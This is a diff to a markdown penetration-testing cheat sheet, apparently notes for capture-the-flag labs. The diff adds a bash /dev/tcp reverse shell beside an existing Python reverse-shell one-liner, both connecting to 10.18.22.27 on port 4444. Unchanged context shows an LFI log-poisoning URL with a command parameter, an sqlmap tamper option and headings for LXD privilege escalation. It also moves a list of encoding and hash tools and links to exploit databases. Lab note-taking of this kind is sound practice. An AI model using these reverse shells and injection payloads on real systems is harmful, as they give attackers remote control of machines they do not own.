@@ -50,6 +50,10 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 ```python
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.22.27",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
 ```
+* bash
+```bash
+bash -i >& /dev/tcp/10.18.22.27/4444 0>&1
+```
 
 ---
 #### Set appropriate permissions for `id_rsa` file before usage:
@@ -112,12 +116,7 @@ http://10.10.62.183/?view=dog/../../../../var/log/apache2/access.log&ext&cmd='co
 ```
 --tamper=space2comment
 ```
----
-###  Encoding techniques:
-- [splitbrain](https://www.splitbrain.org/_static/ook/)
-- [hashes](https://hashes.com/en/tools/hash_identifier)
-- [md5hashing](https://md5hashing.net/hash)
-- [cyberchef](https://gchq.github.io/CyberChef/)
+
 ---
 ### Privilege Escalation:
 #### LXD container exploitation:
@@ -247,10 +246,15 @@ smbclient \\\\10.10.251.241\\nt4wrksv
 
 </details>
 ---
-
 ### links
 * [database with CVE exploits](https://cvexploits.io/)
 * [Linux Kernel CVEs](https://www.linuxkernelcves.com/cves)
 * [reverse shells](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+
+###  Encoding techniques:
+- [splitbrain](https://www.splitbrain.org/_static/ook/)
+- [hashes](https://hashes.com/en/tools/hash_identifier)
+- [md5hashing](https://md5hashing.net/hash)
+- [cyberchef](https://gchq.github.io/CyberChef/)
 ---
 Happy hacking!
